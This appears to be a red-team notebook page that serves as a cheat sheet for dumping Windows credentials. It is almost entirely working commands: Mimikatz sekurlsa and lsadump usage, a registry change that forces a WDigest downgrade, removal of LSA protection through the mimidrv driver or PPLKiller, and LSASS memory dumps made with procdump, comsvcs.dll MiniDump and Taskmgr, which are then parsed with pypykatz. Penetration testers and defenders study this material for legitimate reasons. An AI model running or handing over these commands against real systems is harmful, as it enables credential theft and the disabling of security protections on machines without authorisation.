# [[03 - Offensive Infrastructure/E - Setup Machine/0x03 - Bring Your Own Land/Windows/OS Credential Dumping/Mimikatz|Mimikatz]]

## 01 - LogonPasswords

> [!IMPORTANT] Conditions
> Make sure the `SeDebugPrivilege` is enabled.

```
C:\> whoami.exe /priv
Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Enabled

mimikatz # privilege::debug
Privilege '20' OK
```

Audit by logging the file.

```
mimikatz # log credentials.txt

mimikatz # sekurlsa::logonpasswords
```

> [!INFO] Error Message
> If you receive this error. Go to the **Group Policy Management Editor** > Windows Settings > Security Settings > Local Policies > User Rights Assignment > Debug programs > then uncheck the box **"Define these policy settings:"**

```
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

## 02 - SAM

```
mimikatz # lsadump::sam
```

## 03 - Enable Wdigest

Otherwise another way around it is to dump with **WDigest**.

```
mimikatz # sekurlsa::wdigest
```

> [!INFO] Error Message
> If you receive this error.
> ```
> mimikatz # sekurlsa::wdigest
> ERROR kuhl_m_privilege_acquireLSA ; Handle on memory (0x00000005)
> ```

Simply downgrades to enable mimikatz to retrieve the credentials of the windows workstation.

```
C:\> reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f

PS C:\> Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
```

## 04 - Disable LSA Protection

> [!INFO] Error Message
> If you receive this error.
> ```
> mimikatz # sekurlsa::logonpasswords
> ERROR kuhl_m_privilege_acquireLSA ; Handle on memory (0x00000005)
> ```

Check the registry key value.

```
C:\> reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

```
PS C:\> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Lsa -Name "RunAsPPL"

RunAsPL     : 1
```

### 4.1 - First Method

```
mimikatz # !+
```

Create and start a `mimidrv` service

```
C:\> sc create mimidrv binpath= C:\path\to\mimidrv.sys type= kernel start= demand

C:\> sc start mimidrv
```

```
mimikatz # !processprotect /process:lsass.exe /remove

mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords

mimikatz # !processprotect /process:lsass.exe

mimikatz # !-
```

### 4.2 - Second Method

```
C:\> PPLKiller.exe /installDriver

C:\> PPLKiller.exe /disableLSAProtection

C:\> PPLKiller.exe /uninstallDriver
```

## 05 - Dump LSASS Process

Check if the LSASS process is present

```
C:\> tasklist.exe /fi "imagename eq lsass.exe"

PS C:\> get-process lsass
```

### 5.1 - Dump the process memory

#### 5.1.1 - Sysinternals

```
C:\> procdump.exe /accepteula -ma <lsass_pid> hashmem.dmp

C:\> procdump.exe /accepteula -ma lsass.exe hashmem.dmp

C:\> windbg.exe -p .dump /ma c:\path\to\hashmem.dmp .detach .q

C:\> adplus.exe -hang -pn lsass.exe -o C:\Windows\Temp\output\ -quiet
```

#### 5.1.2 - Living off the Land

##### 5.1.2.1 - Command Prompt

```
C:\> rundll32.exe Comsvcs.dll,Minidump "<lsass_pid> hashmem.dmp full"

C:\> rundll32.exe C:\Windows\System32\Comsvcs.dll,Minidump <lsass_pid> hashmem.dmp full

cmd.exe /Q /c for /f "tokens=1,2 delims= " %%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+000024 %%B \Windows\Temp\*.* full
```

##### 5.1.2.2 - PowerShell

```
C:\> powershell.exe -ep bypass Get-Process lsass C:\Windows\System32\Taskmgr.exe /dumpfile=C:\lsass.dmp /pid=<pid>

PS C:\> rundll32.exe Comsvcs.dll,Minidump ((Get-Process lsass).Id) hashmem.dmp full
```

### 5.2 - Dump credentials

#### 5.2.1 - `pypykatz` (Recommended)

```
$ pypykatz lsa minidump hashmem.dmp

$ pypykatz lsa -k /path/to/file_creds minidump hashmem.dmp

$ pypykatz lsa --json minidump $i | jq 'first(.[]).logon_sessions | keys[] as $k | (.[$k] | .credman_creds)' | grep -v "\[\]" | grep -v "^\[" | grep -v "^\]"
```

#### 5.2.2 - Directly Using `mimikatz`

```
mimikatz # sekurlsa::minidump hashmem.dmp
```

Create a log file

```
mimikatz # log dumpcreds.txt

mimikatz # sekurlsa::logonpasswords
```

---
## References

### Source Repositories

- [RedCursorSecurityConsulting: PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)

- [itm4n: PPLdump](https://github.com/itm4n/PPLdump)

- [HarmJ0y: Invoke-WdigestDowngrade.ps1](https://gist.github.com/HarmJ0y/8fdd2d3acfbe79b730db)

### Microsoft

- [Microsoft: Configuring Additional LSA Protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)

### LOLBAS

- [LOLBAS: Comsvcs](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/)

### InfoSec Matter

- [InfoSec Matter: Powershell Commands for Pentesters](https://www.infosecmatter.com/powershell-commands-for-pentesters/)

### ADSecurity

- [Active Directory Security: Unofficial Guide to Mimimkatz & Command Reference](https://adsecurity.org/?page_id=1821)

### Hacking Articles

- [Hacking Articles: Credential Dumping Wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)

### Mrd0x

- [Mrd0x: Dumping LSASS With Adplus Debugging Tool](https://mrd0x.com/adplus-debugging-tool-lsass-dump/)

### Hades

- [Hades: Mimikatz Comprehensive Guide](https://hadess.io/mimikatz-comprehensive-guide/)

### Itm4na

- [itm4n: LSASS RunAsPPL](https://itm4n.github.io/lsass-runasppl/)

### WhiteOakSecurity

- [WhiteOakSecurity: Attack Defenses Dumping LSASS no Mimikatz](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)

### Red Team Guides

- [Red Team Guides: 64 Methods For Execute Mimikatz](https://blog.redteamguides.com/p/64-methods-for-execute-mimikatz)

### University of California San Francisco

- [University of California San Francisco: FAS Data Security Compliance Program - Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors](https://datasecurity.ucsf.edu/news/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors)